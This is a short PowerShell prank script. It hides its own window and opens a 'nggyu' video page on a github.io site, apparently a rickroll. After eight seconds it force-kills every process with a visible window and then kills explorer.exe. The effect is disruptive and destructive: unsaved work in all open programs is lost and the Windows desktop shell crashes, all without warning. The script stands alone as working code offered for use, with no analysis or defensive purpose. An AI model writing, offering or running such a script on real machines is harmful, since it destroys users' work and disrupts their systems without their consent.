powershell -WindowStyle Hidden -Command {
    start https://H4K0N42.github.io/nggyu/video.webm
    Start-Sleep 8
    $self = $PID
    Get-Process |
        Where-Object { $_.MainWindowTitle -ne '' -and $_.Id -ne $self -and $_.ProcessName -ne 'explorer' } |
        Stop-Process -Force
    taskkill /F /IM explorer.exe
}
